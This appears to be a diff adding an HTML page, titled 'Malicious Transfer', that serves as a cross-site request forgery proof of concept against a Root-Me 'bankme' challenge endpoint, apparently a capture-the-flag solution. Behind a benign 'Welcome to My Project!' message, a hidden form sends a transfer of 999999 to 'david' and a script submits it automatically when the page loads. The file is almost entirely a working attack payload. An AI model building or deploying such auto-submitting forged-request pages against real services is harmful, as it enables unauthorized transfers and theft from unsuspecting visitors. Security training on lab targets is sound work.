@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Malicious Transfer</title>
+</head>
+<body>
+    <h1>Welcome to My Project!</h1>
+    <p>Thank you for visiting.</p>
+
+    <!-- CSRF Form -->
+    <form id="csrf-form" action="https://bankme-1.challenges.pro.root-me.org/transfer/" method="POST">
+        <!-- Paramètres transférés -->
+        <input type="hidden" name="recipient" value="david">
+        <input type="hidden" name="amount" value="999999">
+    </form>
+
+    <!-- Soumission automatique -->
+    <script>
+        // Soumet automatiquement le formulaire dès que la page est chargée
+        document.getElementById("csrf-form").submit();
+    </script>
+</body>
+</html>
